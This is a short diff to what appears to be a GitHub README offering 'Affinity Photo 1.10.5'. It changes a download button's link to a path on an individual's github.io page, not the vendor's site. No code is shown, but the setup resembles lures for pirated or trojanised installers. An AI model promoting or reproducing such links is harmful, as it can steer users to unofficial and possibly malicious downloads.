@@ -21,7 +21,7 @@ To begin using this **Affinity Photo 1.10.5 Image Editor** and advanced **RAW Pr
 | :--- | :--- |
 | **Get Affinity Photo 1.10.5** | Click the button below to initiate the setup for this **Affinity Photo 1.10.5 Professional Workflow**. |
 
-[![Button](https://img.shields.io/badge/📦-Get_Affinity_Photo_1.10.5-2ea44f?style=for-the-badge)](https://edouardcatina131.github.io/.github/)
+[![Button](https://img.shields.io/badge/📦-Get_Affinity_Photo_1.10.5-2ea44f?style=for-the-badge)](https://edouardcatina131.github.io/.github/affinity-photo-1-10-5)
 
 ## System Requirements
 
